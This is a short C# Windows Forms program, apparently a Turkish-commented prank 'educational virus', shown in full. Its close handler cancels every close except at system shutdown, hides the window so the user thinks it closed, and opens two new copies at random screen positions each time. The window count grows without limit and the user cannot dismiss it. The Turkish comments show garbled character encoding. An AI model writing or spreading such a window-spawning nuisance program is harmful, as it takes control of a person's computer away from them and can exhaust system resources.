using System.Diagnostics;

namespace Virus
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
        }

        static Random rnd = new Random();

        private void Form1_Load(object sender, EventArgs e)
        {
            // Formun içindeki yazý
            Label lbl = new Label();
            lbl.Text = "BU BIR EÐITIM VIRUSUDUR \nKapatamazsýn!";
            lbl.Font = new Font("Arial", 20, FontStyle.Bold);
            lbl.ForeColor = Color.Red;
            lbl.AutoSize = true;
            lbl.Location = new Point(10, 10);
            this.Controls.Add(lbl);

            // Baþlýk da deðiþsin
            this.Text = "HATA!";

            // Ýstersen o meþhur sesi de ekle (bip sesi)
            System.Media.SystemSounds.Hand.Play();
        }


        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            // EÐER BÝLGÝSAYAR KAPATILIYORSA ENGELLEME (Yoksa PC kapanmaz :D)
            if (e.CloseReason == CloseReason.WindowsShutDown) return;

            // 1. KAPANMAYI ÝPTAL ET (Asýl hile burada)
            e.Cancel = true;

            // 2. MEVCUT FORMU GÝZLE (Kullanýcý kapattým sansýn)
            this.Hide();

            // 3. YENÝLERÝ DOÐUR (Hydra etkisi)
            // Her kapanýþta 2 tane yeni açýyoruz
            for (int i = 0; i < 2; i++)
            {
                Form1 frm = new Form1();

                // Rastgele bir konum belirleyelim ki üst üste binmesinler
                Random rnd = new Random();
                int x = rnd.Next(0, Screen.PrimaryScreen.Bounds.Width - 200);
                int y = rnd.Next(0, Screen.PrimaryScreen.Bounds.Height - 150);

                frm.StartPosition = FormStartPosition.Manual;
                frm.Location = new System.Drawing.Point(x, y); // System.Drawing ekli deðilse using ekle

                frm.Show(); // ShowDialog deðil, Show!
            }
        }
    }
}
